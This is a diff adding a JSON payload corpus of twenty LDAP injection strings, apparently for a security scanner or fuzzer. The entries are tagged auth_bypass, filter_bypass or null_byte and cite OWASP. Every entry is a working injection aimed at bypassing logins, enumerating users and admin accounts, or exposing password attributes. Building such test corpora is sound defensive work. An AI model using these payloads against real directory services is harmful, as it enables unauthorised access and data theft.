@@ -1,0 +1,202 @@
+[
+  {
+    "id": "ldapi-001",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "*)(uid=*))(|(uid=*",
+    "context": "string",
+    "description": "LDAP auth bypass using wildcard injection",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-002",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "*)(|(password=*)",
+    "context": "string",
+    "description": "LDAP wildcard injection to match any password",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-003",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(cn=*",
+    "context": "string",
+    "description": "LDAP filter closure and injection",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-004",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "admin)(&(password=*))",
+    "context": "string",
+    "description": "LDAP filter bypass for admin account enumeration",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-005",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": "*))(|(cn=*",
+    "context": "string",
+    "description": "LDAP filter manipulation via OR condition",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-006",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "*))(|(objectclass=*",
+    "context": "string",
+    "description": "LDAP injection to enumerate all object classes",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-007",
+    "family": "ldapi",
+    "subtype": "null_byte",
+    "payload_string": "admin\u0000",
+    "context": "string",
+    "description": "Null byte LDAP injection to truncate filter",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-008",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(!(cn=abc)",
+    "context": "string",
+    "description": "LDAP NOT filter injection",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-009",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "*",
+    "context": "string",
+    "description": "Bare wildcard LDAP injection — matches all entries",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-010",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(sn=*",
+    "context": "string",
+    "description": "LDAP filter injection via surname attribute",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-011",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "admin)(|(objectClass=*)",
+    "context": "string",
+    "description": "LDAP objectClass wildcard bypass with admin prefix",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-012",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(|(mail=*@*)",
+    "context": "string",
+    "description": "LDAP filter injection targeting mail attribute",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-013",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "*))%00",
+    "context": "string",
+    "description": "LDAP wildcard injection with URL-encoded null byte",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-014",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(uid=admin",
+    "context": "string",
+    "description": "LDAP injection to directly target admin uid",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-015",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(|(cn=admin)(cn=root)(cn=administrator)",
+    "context": "string",
+    "description": "LDAP injection to match multiple privileged account names",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-016",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "x)(objectClass=*)(cn=x",
+    "context": "string",
+    "description": "LDAP injection wrapping the original filter",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-017",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(&(objectClass=user)(|(cn=*))",
+    "context": "string",
+    "description": "LDAP compound filter injection to list all users",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-018",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "*)(|(userPassword=*)",
+    "context": "string",
+    "description": "LDAP injection to enumerate userPassword attribute",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-019",
+    "family": "ldapi",
+    "subtype": "filter_bypass",
+    "payload_string": ")(|(telephoneNumber=*)",
+    "context": "string",
+    "description": "LDAP filter injection via telephoneNumber attribute",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ldapi-020",
+    "family": "ldapi",
+    "subtype": "auth_bypass",
+    "payload_string": "admin)(!(&(1=0)(uid=admin",
+    "context": "string",
+    "description": "LDAP logical negation bypass for admin account",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  }
+]
